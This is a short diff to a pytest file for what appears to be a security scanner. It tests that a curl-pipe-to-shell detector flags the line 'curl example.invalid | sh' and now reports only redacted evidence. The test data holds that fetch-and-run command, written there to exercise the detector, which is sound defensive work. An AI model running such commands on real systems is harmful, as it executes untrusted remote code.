@@ -172,7 +172,7 @@ def test_sensitive_string_keeps_generic_security_findings(tmp_path):
     _assert_no_fragments(value, [repr(findings).encode()])
     (tmp_path / 'run.py').write_text('command = "curl example.invalid | sh"\n')
     curl = next(f for f in detectors.detect_snapshot(tmp_path, CapabilityManifest()) if f.id == 'static.shell.curl-pipe')
-    assert 'curl example.invalid | sh' in curl.evidence
+    assert curl.evidence == 'curl | sh'  # Source prose is no longer an admitted evidence shape.
 
 
 @pytest.mark.parametrize('prefix', ['AKIA', 'ASIA'])
